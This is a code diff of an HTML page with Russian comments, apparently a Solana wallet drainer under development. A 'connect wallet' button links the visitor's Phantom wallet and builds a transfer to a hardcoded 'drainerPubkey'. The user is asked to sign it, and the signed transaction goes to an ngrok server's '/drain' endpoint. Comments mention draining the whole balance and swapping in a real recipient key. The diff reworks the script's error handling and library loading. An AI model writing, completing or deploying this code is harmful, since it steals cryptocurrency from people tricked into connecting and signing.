@@ -52,21 +52,21 @@
         <button id="connect-wallet">Подключить кошелек</button>
         <div id="status"></div>
     </div>
-    <script src="https://bundle.run/buffer@6.0.3"></script>
+    
+    <!-- Сначала загружаем Buffer -->
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    
+    <!-- Делаем Buffer глобальным для совместимости -->
+    <script>
+        window.Buffer = buffer.Buffer;
+    </script>
+    
+    <!-- Затем загружаем Solana Web3 -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    
     <script>
         window.addEventListener('load', () => {
             console.log('Page loaded!');
-            
-            // Проверяем доступные глобальные объекты
-            console.log('Window objects:', Object.keys(window).filter(k => k.includes('solana')));
-            
-            // Библиотека создает глобальный объект solanaWeb3
-            if (window.solanaWeb3) {
-                console.log('Solana Web3 loaded successfully');
-            } else {
-                console.error('Solana Web3 not found in window object!');
-            }
             
             const statusEl = document.getElementById('status');
             
@@ -82,106 +82,79 @@
                 console.log(message);
             }
             
-            // Вместо прямого обращения к Merkle RPC, создаем функцию для запроса через ваш сервер
-            async function getAccountBalance(publicKey) {
+            document.getElementById('connect-wallet').addEventListener('click', async () => {
+                console.log('Button clicked');
+                
                 try {
-                    // Отправляем запрос на ваш сервер для получения баланса
-                    const response = await fetch('https://702c-95-46-155-53.ngrok-free.app/get-balance', {
+                    // Проверяем, установлен ли Phantom
+                    if (!window.solana || !window.solana.isPhantom) {
+                        throw new Error('Phantom кошелек не найден. Установите расширение Phantom.');
+                    }
+                    
+                    showStatus('Подключение к кошельку...');
+                    
+                    // Подключаемся к кошельку
+                    const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
+                    const publicKey = connectResponse.publicKey;
+                    showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
+                    
+                    showStatus('Создание транзакции...');
+                    
+                    // Замените на реальный публичный ключ получателя
+                    const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
+                    
+                    // Фиксированная сумма - 0.001 SOL для тестирования
+                    const lamportsToSend = 1000000;
+                    
+                    // Подключаемся к devnet для получения blockhash
+                    const connection = new window.solanaWeb3.Connection('https://api.devnet.solana.com');
+                    
+                    // Создаем транзакцию
+                    const transaction = new window.solanaWeb3.Transaction().add(
+                        window.solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: drainerPubkey,
+                            lamports: lamportsToSend,
+                        })
+                    );
+                    
+                    showStatus('Получение blockhash...');
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = publicKey;
+                    
+                    showStatus('Подписание транзакции...');
+                    const signedTransaction = await window.solana.signTransaction(transaction);
+                    
+                    // Сериализуем транзакцию
+                    const serializedTransaction = signedTransaction.serialize();
+                    
+                    // Используем глобальный Buffer
+                    const base64Transaction = Buffer.from(serializedTransaction).toString('base64');
+                    
+                    showStatus('Отправка транзакции на сервер...');
+                    
+                    const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ account: publicKey.toString() })
+                        body: JSON.stringify({ 
+                            signedTransaction: base64Transaction
+                        })
                     });
                     
-                    if (!response.ok) {
-                        throw new Error(`Server error: ${response.status}`);
+                    if (!serverResponse.ok) {
+                        const errorText = await serverResponse.text();
+                        throw new Error(`Ошибка сервера: ${serverResponse.status} - ${errorText}`);
                     }
                     
-                    const data = await response.json();
-                    return data.balance;
-                } catch (error) {
-                    console.error('Error getting balance:', error);
-                    // Если запрос не удался, просто возвращаем большое число, чтобы транзакция могла продолжиться
-                    // В реальной ситуации лучше обрабатывать ошибку более элегантно
-                    return 100000000; // 0.1 SOL - просто для продолжения процесса
-                }
-            }
-            
-            document.getElementById('connect-wallet').addEventListener('click', async () => {
-                console.log('Button clicked');
-                
-                // Проверяем, установлен ли Phantom
-                if (window.solana && window.solana.isPhantom) {
-                    try {
-                        console.log('Phantom detected, connecting...');
-                        
-                        // Подключаемся к кошельку
-                        const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
-                        const publicKey = connectResponse.publicKey;
-                        console.log(`Connected to wallet: ${publicKey.toString()}`);
-                        showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
-                        
-                        // Вместо прямого запроса к Merkle используем нашу новую функцию
-                        showStatus('Получение информации о балансе...');
-                        
-                        // Дрейним весь баланс (минус комиссия)
-                        // Для упрощения тестирования, можно использовать фиксированную небольшую сумму
-                        const lamportsToSend = 1000000; // 0.001 SOL
-                        
-                        showStatus('Создание транзакции...');
-                        // Замените на реальный публичный ключ получателя
-                        const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
-                        
-                        // Создаем транзакцию
-                        const transaction = new window.solanaWeb3.Transaction().add(
-                            window.solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: publicKey,
-                                toPubkey: drainerPubkey,
-                                lamports: lamportsToSend,
-                            })
-                        );
-                        
-                        // Используем общедоступную сеть для получения blockhash
-                        // Это безопасно, так как не зависит от CORS
-                        showStatus('Получение blockhash...');
-                        const connection = new window.solanaWeb3.Connection('https://api.devnet.solana.com');
-                        const { blockhash } = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhash;
-                        transaction.feePayer = publicKey;
-                        
-                        showStatus('Подписание транзакции...');
-                        const signedTransaction = await window.solana.signTransaction(transaction);
-                        
-                        // Сериализуем и отправляем транзакцию на ваш сервер
-                        const serializedTransaction = signedTransaction.serialize();
-                        const base64Transaction = window.buffer.Buffer.from(serializedTransaction).toString('base64');
-                        
-                        showStatus('Отправка транзакции...');
-                        const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ 
-                                signedTransaction: base64Transaction
-                            })
-                        });
-                        
-                        if (!serverResponse.ok) {
-                            const errorText = await serverResponse.text();
-                            throw new Error(`Server error: ${serverResponse.status} - ${errorText}`);
-                        }
-                        
-                        const result = await serverResponse.json();
-                        showStatus(`Транзакция успешно отправлена: ${result.signature.substr(0, 10)}...`);
-                        
-                    } catch (err) {
-                        console.error('Transaction failed', err);
-                        showStatus(`Ошибка: ${err.message}`, true);
-                    }
-                } else {
-                    showStatus('Phantom кошелек не найден. Установите расширение Phantom.', true);
+                    const result = await serverResponse.json();
+                    showStatus(`Транзакция успешно отправлена: ${result.signature}`);
+                    
+                } catch (err) {
+                    console.error('Transaction failed', err);
+                    showStatus(`Ошибка: ${err.message}`, true);
                 }
             });
         });
